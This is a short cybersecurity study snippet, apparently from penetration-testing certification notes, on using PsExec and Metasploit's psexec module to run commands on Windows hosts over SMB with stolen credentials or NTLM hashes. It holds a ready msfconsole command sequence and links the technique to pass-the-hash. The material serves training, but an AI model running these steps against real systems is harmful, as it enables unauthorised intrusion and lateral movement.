---
title: "PsExec: remote command execution over SMB"
description: "Microsoft's lightweight telnet replacement for running commands over SMB with valid credentials."
pubDate: 2026-11-11
category: "Cybersecurity"
source: "INE Certification"
lang: "msfconsole"
tags: ["psexec", "smb", "windows", "metasploit"]
draft: false
---

PsExec authenticates over SMB and executes processes on a remote Windows system under any account you have valid credentials (or a hash) for. It's functionally similar to RDP, except you're sending commands rather than controlling an entire session.

## Metasploit module

```bash
# Metasploit's psexec module
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser <username>
set SMBPass <password_or_ntlm_hash>
run
```

## Notes

- Once you have legitimate SMB credentials (brute-forcing or hash dump), PsExec is usually the fastest path to a shell.
- It's the same mechanic underlying [pass-the-hash](/snippets/cybersecurity/exploitation/post-exploitation-persistence/windows-hash-dump-pass-the-hash) attacks against SMB, since the module accepts an NTLM hash in place of a password.

## Related

- [SMB exploitation](/snippets/cybersecurity/exploitation/remote-service-exploitation/smb-exploitation): brute-force then PsExec, or EternalBlue
- [Windows hash dumping and pass-the-hash](/snippets/cybersecurity/exploitation/post-exploitation-persistence/windows-hash-dump-pass-the-hash): where the hash comes from
- [CrackMapExec](/snippets/cybersecurity/tools/credential-attack-tools/crackmapexec): validate credentials across SMB before using them
- [SMB & NetBIOS enumeration](/snippets/cybersecurity/enumeration-recon/smb-enumeration): finding the target and shares first
